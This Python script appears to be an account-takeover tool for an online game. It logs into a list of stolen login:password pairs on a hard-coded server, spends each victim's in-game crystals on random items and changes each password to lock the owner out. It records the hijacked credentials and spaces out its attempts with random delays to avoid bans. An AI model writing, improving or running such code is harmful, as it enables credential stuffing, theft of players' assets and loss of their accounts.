﻿from proxyclient import ProxyClient
import random
import utils
import sys
import time

destination_ip = "135.125.188.169"
destination_port = 6969
delay_min = 3
delay_max = 15

def buy_rnd_item(client, crystalls, min_crystalls, item_name, item_price):
    if crystalls > min_crystalls:
        max_count = crystalls // item_price
        count = random.randint(1, max_count)
        client.buy_item(item_name, count)
        crystalls -= count * item_price
        print(f"Bought {count} {item_name}")
    return crystalls

def buy_rnd_items(client, crystalls, items = None):
    crystalls = buy_rnd_item(client, crystalls, 20000, "1000_scores_m0", 4000)
    crystalls = buy_rnd_item(client, crystalls, 50, "armor_m0", 50)
    crystalls = buy_rnd_item(client, crystalls, 50, "double_damage_m0", 50)
    crystalls = buy_rnd_item(client, crystalls, 50, "n2o_m0", 50)
    crystalls = buy_rnd_item(client, crystalls, 150, "health_m0", 150)
    if crystalls > 5000:
        for item in items:
            client.buy_item(item, 1)

def change_rnd_password(client, passwords):
    random_pwd = random.choice(passwords)
    isChanged = client.change_password(password, random_pwd)
    if isChanged:
        print(f"Changed password on {login} to {random_pwd}")
        return random_pwd
    print(f"Can't change password on {login}")
    return password

if __name__ == '__main__':
    accounts_path = 'data/accounts.txt'
    if len(sys.argv) > 1:
        accounts_path = sys.argv[1]
    items = utils.read_file('data/items.txt')
    accounts = utils.read_file(accounts_path)
    passwords = utils.read_file('data/passwords.txt')
    remain = accounts.copy()
    for account in accounts:
        login, _, password = account.partition(':')
        client = ProxyClient(destination_ip, destination_port)
        try:
            try:
                client.handshake()
            except Exception:
                print("IP BANNED!")
                break
            current_user = client.auth(login, password)
            if current_user:
                crystalls = current_user['crystall']
                buy_rnd_items(client, crystalls, items)
                password = change_rnd_password(client, passwords)
                utils.write_file("data/proccessed.txt", f"{login}:{password}\n", True)
                print(f"Processed account {login}")
            else:
                utils.write_file("data/online.txt", f"{login}:{password}\n", True)
                print(f"Account {login} is online or invalid credentials")
        except Exception as e:
            if hasattr(e, 'message'):
                print(e.message)
            else:
                print(e)
            utils.write_file("data/errors.txt", f"{login}:{password}\n", True)
            print(f"Error with account {account}")
        remain.remove(account)
        utils.write_lines("data/remain.txt", remain)
        client.disconnect()
        random_delay = random.randint(delay_min, delay_max)
        time.sleep(random_delay)
        print(f"Sleeping {random_delay} seconds..")
    input("Press enter to exit..")
